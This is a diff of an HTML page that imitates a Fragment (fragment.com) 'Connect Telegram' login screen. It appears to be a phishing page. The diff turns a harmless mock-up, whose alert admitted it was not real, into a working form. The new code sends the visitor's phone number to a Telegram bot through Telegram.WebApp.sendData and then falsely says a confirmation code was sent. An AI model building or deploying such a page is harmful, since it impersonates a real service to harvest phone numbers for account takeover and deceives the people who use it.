@@ -3,206 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Telegram - Fragment1</title>
+    <title>Connect Telegram - Fragment</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="styles.css">
-    <style>
-        .telegram-login {
-            max-width: 400px;
-            margin: 0 auto;
-            padding: 40px 20px;
-            text-align: center;
-        }
-        
-        .telegram-login-header {
-            font-size: 32px;
-            font-weight: 700;
-            margin-bottom: 24px;
-            color: #fff;
-        }
-        
-        .telegram-login-content {
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 16px;
-            padding: 30px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            margin-bottom: 20px;
-        }
-        
-        .telegram-login-text {
-            color: rgba(255, 255, 255, 0.7);
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-        
-        .telegram-login-bot {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 20px;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.02);
-            border-radius: 12px;
-        }
-        
-        .telegram-bot-avatar {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            background: #0088cc;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 18px;
-            color: white;
-        }
-        
-        .telegram-bot-info {
-            text-align: left;
-        }
-        
-        .telegram-bot-name {
-            font-weight: 500;
-            color: #fff;
-        }
-        
-        .telegram-bot-username {
-            color: rgba(255, 255, 255, 0.6);
-            font-size: 14px;
-        }
-        
-        .phone-input-group {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .country-code {
-            width: 80px;
-        }
-        
-        .phone-number {
-            flex: 1;
-        }
-        
-        .form-input {
-            width: 100%;
-            padding: 12px 16px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
-            color: #fff;
-            font-size: 16px;
-        }
-        
-        .form-input:focus {
-            outline: none;
-            border-color: #0088cc;
-        }
-        
-        .login-button {
-            width: 100%;
-            padding: 12px 24px;
-            background: #0088cc;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s ease;
-        }
-        
-        .login-button:hover {
-            background: #0077b3;
-        }
-        
-        .back-button {
-            display: inline-block;
-            padding: 10px 20px;
-            color: rgba(255, 255, 255, 0.7);
-            text-decoration: none;
-            border-radius: 8px;
-            transition: color 0.2s ease;
-        }
-        
-        .back-button:hover {
-            color: #fff;
-        }
-    </style>
 </head>
-<body class="emoji_image no-transition">
-    <div class="progress-bar"></div>
-    
-    <div>
-        <header class="tm-header">
-            <div class="tm-header-logo">
-                <a href="/" class="tm-logo">
-                    <i class="tm-logo-icon"></i>
-                    <span class="tm-logo-text">Fragment</span>
-                </a>
-            </div>
-            <div class="tm-header-body">
-                <div class="tm-header-tabs-wrap">
-                    <div class="tm-header-tabs">
-                        <span class="tm-header-tab" style="color: rgba(255, 255, 255, 0.7);"></span>
-                    </div>
-                </div>
-            </div>
-            <div class="tm-header-actions tm-header-actions-wide">
-                <button class="btn btn-default tm-header-action" onclick="window.history.back()">
-                    <span class="tm-button-label">Back</span>
-                </button>
-            </div>
-        </header>
-        
-        <main class="tm-main">
-            <div class="telegram-login">
-                <h1 class="telegram-login-header">Connect Telegram</h1>
-                
-                <div class="telegram-login-content">
-                    <p class="telegram-login-text">
-                        Log in to use your Telegram account for <b>fragment.com</b> and receive notifications.
-                    </p>
-                    
-                    <div class="telegram-login-bot">
-                        <div class="telegram-bot-avatar">F</div>
-                        <div class="telegram-bot-info">
-                            <div class="telegram-bot-name">Bot check fragment</div>
-                            <div class="telegram-bot-username">@fragment</div>
-                        </div>
-                    </div>
-                    
-                    <p class="telegram-login-text">
-                        Enter your phone number in international format. A confirmation code will be sent via Telegram.
-                    </p>
-                    
-                    <div class="phone-input-group">
-                        <div class="country-code">
-                            <input type="text" class="form-input" value="+1" readonly>
-                        </div>
-                        <div class="phone-number">
-                            <input type="tel" class="form-input" placeholder="Phone number" id="phone-input">
-                        </div>
-                    </div>
-                    
-                    <button class="login-button" id="login-submit">
-                        Next
-                    </button>
-                </div>
-                
-                <a href="index.html" class="back-button">← Back to Fragment</a>
-            </div>
-        </main>
+<body>
+    <div class="telegram-login">
+        <h1 class="telegram-login-header">Connect Telegram</h1>
+        <div class="telegram-login-content">
+            <p class="telegram-login-text">
+                Enter your phone number. A confirmation code will be sent via Telegram.
+            </p>
+            <input type="tel" class="form-input" placeholder="Phone number" id="phone-input">
+            <button class="login-button" id="login-submit">Next</button>
+        </div>
+        <a href="index.html" class="back-button">← Back to Fragment</a>
     </div>
 
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
+        Telegram.WebApp.ready();
+
         document.getElementById('login-submit').addEventListener('click', function() {
             const phone = document.getElementById('phone-input').value;
             if (phone) {
-                alert('Confirmation code would be sent to: +1' + phone + '\n\nIn a real implementation, this would trigger the Telegram OAuth flow.');
+                Telegram.WebApp.sendData(JSON.stringify({ phone }));
+                alert('Confirmation code sent to: ' + phone);
             } else {
                 alert('Please enter your phone number');
             }
